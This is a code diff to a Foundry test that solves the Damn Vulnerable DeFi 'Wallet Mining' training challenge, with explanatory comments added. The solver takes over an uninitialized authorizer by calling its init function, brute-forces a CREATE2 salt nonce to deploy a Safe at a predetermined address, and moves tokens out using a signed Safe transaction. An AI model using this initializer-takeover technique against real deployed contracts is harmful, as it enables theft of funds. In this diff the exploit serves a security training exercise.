@@ -162,18 +162,15 @@ contract WalletMiningChallenge is Test {
      */
     function test_walletMining() public checkSolvedByPlayer {
         // Constraints:
-        // User must not send a transaction even tho we have their private key
+        // User must not send a transaction even though we have their private key
         // Player can only send 1 transaction
 
         // Steps to solve Wallet Mining challenge:
         // 1) Deploy ChallengeSolver contract to execute all necessary operations in one transaction
-        // 2) Recover all tokens from the wallet deployer contract and send them to the corresponding ward
-        // 3) figure out the salt value and init code that deploys the safe to the correct address
-        // 4) deploy safe on behalf of user to expected safe address
-        // 5) recover funds from safe and send to user
-
-        assert(address(walletDeployer.cpy()) == address(singletonCopy));
-        assert(address(walletDeployer.cook()) == address(proxyFactory));
+        // 2) Figure out the saltNonce value and safe setup parameters that deploy the safe to the correct address
+        // 3) Deploy safe through WalletDeployer on behalf of user at expected address
+        // 4) Receive reward tokens from the wallet deployer contract and send them to the ward address
+        // 6) Sign safe transaction with users private key and recover funds from safe by sending tokens to user address
 
         // deploy challenge solver contract to execute necessary operations in one transaction
         new ChallengeSolver(token, authorizer, walletDeployer, proxyFactory, ward, user, userPrivateKey);
@@ -218,16 +215,15 @@ import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
 // import {Script} from "forge-std/Script.sol";
 
 contract ChallengeSolver is Test {
+    error ChallengeSolver__DropFailed();
     error ChallengeSolver__SafeTokenTransferFailed();
     error ChallengeSolver__SaltNotFound();
 
     address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
     uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
-
     address ward;
     address user;
     uint256 userPrivateKey;
-
     DamnValuableToken token;
     AuthorizerUpgradeable authorizer;
     WalletDeployer walletDeployer;
@@ -270,20 +266,28 @@ contract ChallengeSolver is Test {
         _sendFundsFromSafeToUserWithSafeTransaction();
     }
 
+    // take advantage of improperly initialized AuthorizerUpgradeable contract to call init and authorize ourselves as a ward
     function _authorizeChallengeSolverAsWard() internal {
         // check if initialization is possible
         console.log("authorizer needsInit: ", authorizer.needsInit());
-        // load arrays with this contracts address and user deposit address for init call
+
+        // load arrays with this contracts address and USER_DEPOSIT_ADDRESS for init call
         address[] memory wards = new address[](1);
         wards[0] = address(this);
         address[] memory aims = new address[](1);
         aims[0] = USER_DEPOSIT_ADDRESS;
-        // call init too approve this contract to deploy a safe proxy at the user deposit address
-        authorizer.init(wards, aims);
+
+        // ensure init can still be called. If needsInit = 0 then init is locked
+        if (authorizer.needsInit() != 0) {
+            // call init to approve this contract as an authorized safe proxy deployer at USER_DEPOSIT_ADDRESS
+            authorizer.init(wards, aims);
+        }
     }
 
+    // load initialization data, find required saltNonce, deploy safe proxy at desired address, and setup safe on behalf of user
     function _deploySafeProxyAtUserDepositAddress() internal {
-        // load initialization data for basic safe proxy deployment on users behalf
+        // load initialization data for basic safe deployment on users behalf (owner: user, threshold: 1, other fields: empty)
+        // In this deployer, the initializer data affects the salt derivation (hash(initializer), saltNonce), so all initializer fields matter because they change salt which changes the deployed address
         address[] memory owners = new address[](1);
         owners[0] = user;
         uint256 threshold = 1;
@@ -293,26 +297,35 @@ contract ChallengeSolver is Test {
         address paymentToken = address(0);
         uint256 payment = 0;
         address paymentReceiver = address(0);
+
+        // encode safe setup function call with parameters to pass to WalletDeployer
         bytes memory initializerDataForSafeCreation = abi.encodeWithSelector(
             Safe.setup.selector, owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver
         );
 
-        console.logBytes32(keccak256(initializerDataForSafeCreation)); // = 0x63abaf09a56a704390e7608eea07de782d4306abae05ddc2ef967e9199e099b6
-
         // mine initial salt nonce needed to get safe proxy deployed at required address by predicting addresses created with different nonces
         uint256 saltNonce = _mineSaltNonce(initializerDataForSafeCreation);
-
         console.log("Matching Salt Nonce Found: ", saltNonce);
 
         // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
-        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializerDataForSafeCreation, saltNonce);
+        // verify deployment succeeded and token reward was received
+        if (
+            !walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializerDataForSafeCreation, saltNonce)
+                || token.balanceOf(address(this)) != walletDeployer.pay()
+        ) {
+            revert ChallengeSolver__DropFailed();
+        }
     }
 
+    // try multiple saltNonces to find the one needed for challenge solution
     function _mineSaltNonce(bytes memory initializerDataForSafeCreation) internal view returns (uint256) {
+        // load state before loop for efficiency
         address predictedAddress;
         address cpy = walletDeployer.cpy();
         address cook = address(walletDeployer.cook());
         bytes memory creationCode = proxyFactory.proxyCreationCode();
+
+        // loop through possible saltNonces using basic safe proxy deployment values to find which saltNonce gets the proxy to deploy at the desired address
         for (uint256 i = 0; i < 1_000_000; i++) {
             predictedAddress = _predictDeployedAddress(cook, cpy, initializerDataForSafeCreation, i, creationCode);
             if (predictedAddress == USER_DEPOSIT_ADDRESS) {
@@ -322,6 +335,7 @@ contract ChallengeSolver is Test {
         revert ChallengeSolver__SaltNotFound();
     }
 
+    // generate proxy deployment address through process that mirrors WalletDeployer flow
     function _predictDeployedAddress(
         address cook,
         address cpy,
@@ -329,13 +343,20 @@ contract ChallengeSolver is Test {
         uint256 saltNonce,
         bytes memory creationCode
     ) internal pure returns (address predictedAddress) {
+        // salt and deploymentData generation process copied directly from SafeProxyFactory
         bytes32 salt = keccak256(abi.encodePacked(keccak256(initializerDataForSafeCreation), saltNonce));
         bytes memory deploymentData = abi.encodePacked(creationCode, uint256(uint160(cpy)));
+        // Create2 would typically do this internally but since we are simulating the create2 process without actually deploying, we need to take the keccak256 hash and convert to bytes32
         bytes32 deploymentDataHash = keccak256(deploymentData);
+        // simulate create2 process to predict the address that would be generated through SafeProxyFactory deployment flow
+        // note: cook address is needed since create2 uses the calling address within the hash to generate the final deployment hash and deployment address (cook is the calling address in WalletDeployer flow)
+        // if we used create2 to simulate the deployment process here it would wrongly use address(this) instead of cook so it is important we simulate as opposed to directly using create2 for predicting the deployment address
         bytes32 create2DeploymentHash = keccak256(abi.encodePacked(bytes1(0xff), cook, salt, deploymentDataHash));
+        // convert the deployment hash generated by the simulated create2 process into the address that the proxy would have been deployed at
         predictedAddress = address(uint160(uint256(create2DeploymentHash)));
     }
 
+    // build, sign, and execute safe transaction using the users private key to recover the DVT from the safe and sends all tokens to the user
     function _sendFundsFromSafeToUserWithSafeTransaction() internal {
         // load transaction data to be used in safe execTransaction call
         bytes memory safeTransactionData = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
@@ -355,7 +376,7 @@ contract ChallengeSolver is Test {
                 Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
             );
 
-        // sign safe transaction with users private key and pack for verification
+        // sign safe transaction with users private key and pack for verification by the deployed safe
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTransactionDigest);
         bytes memory signatures = abi.encodePacked(r, s, v);
 
